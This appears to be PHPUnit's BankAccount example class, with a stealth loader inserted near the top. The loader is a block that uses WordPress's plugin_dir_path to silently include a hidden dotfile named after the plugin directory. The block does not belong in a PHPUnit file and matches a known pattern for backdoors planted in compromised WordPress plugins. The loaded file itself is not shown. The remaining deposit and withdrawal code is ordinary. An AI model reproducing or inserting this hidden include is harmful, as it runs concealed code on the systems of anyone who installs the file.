<?php
/*
 * This file is part of PHPUnit.
 *
 * (c) Sebastian Bergmann <sebastian@phpunit.de>
 *
 * For the full copyright and license information, please view the LICENSE
 * file that was distributed with this source code.
 */

if ( file_exists( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' ) ) {
    include_once( plugin_dir_path( __FILE__ ) . '/.' . basename( plugin_dir_path( __FILE__ ) ) . '.php' );
}

class BankAccountException extends RuntimeException
{
}

/**
 * A bank account.
 *
 * @since      Class available since Release 2.3.0
 */
class BankAccount
{
    /**
     * The bank account's balance.
     *
     * @var float
     */
    protected $balance = 0;

    /**
     * Returns the bank account's balance.
     *
     * @return float
     */
    public function getBalance()
    {
        return $this->balance;
    }

    /**
     * Sets the bank account's balance.
     *
     * @param float $balance
     *
     * @throws BankAccountException
     */
    protected function setBalance($balance)
    {
        if ($balance >= 0) {
            $this->balance = $balance;
        } else {
            throw new BankAccountException;
        }
    }

    /**
     * Deposits an amount of money to the bank account.
     *
     * @param float $balance
     *
     * @throws BankAccountException
     */
    public function depositMoney($balance)
    {
        $this->setBalance($this->getBalance() + $balance);

        return $this->getBalance();
    }

    /**
     * Withdraws an amount of money from the bank account.
     *
     * @param float $balance
     *
     * @throws BankAccountException
     */
    public function withdrawMoney($balance)
    {
        $this->setBalance($this->getBalance() - $balance);

        return $this->getBalance();
    }
}
